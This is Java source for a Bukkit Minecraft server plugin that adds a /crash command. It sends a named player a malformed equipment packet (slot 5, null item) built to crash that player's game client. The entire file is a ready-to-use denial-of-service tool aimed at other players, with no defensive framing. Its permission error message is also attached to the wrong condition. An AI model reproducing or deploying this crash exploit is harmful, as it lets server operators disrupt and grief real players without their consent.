package net.xornick.crash;

import net.minecraft.server.v1_8_R1.PacketPlayOutEntityEquipment;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.craftbukkit.v1_8_R1.entity.CraftPlayer;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

public class Crash extends JavaPlugin {

    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (sender instanceof Player) {
            Player player = (Player) sender;
            if (command.getName().equalsIgnoreCase("crash")) {
                if (player.hasPermission("crash.use")) {
                    if (args.length == 1) {
                        Player target = getServer().getPlayer(args[0]);
                        if (target == null) {
                            player.sendMessage(ChatColor.RED + "This player does not exist.");
                            return true;
                        }
                        PacketPlayOutEntityEquipment packet = new PacketPlayOutEntityEquipment(player.getEntityId(), 5, null);
                        ((CraftPlayer) target).getHandle().playerConnection.sendPacket(packet);
                        player.sendMessage(ChatColor.RED + "Crashed player " + target.getName());
                    } else {
                        player.sendMessage(ChatColor.RED + "You do not have permission to crash players.");
                        return true;
                    }
                }
            }
        }
        return false;
    }
}
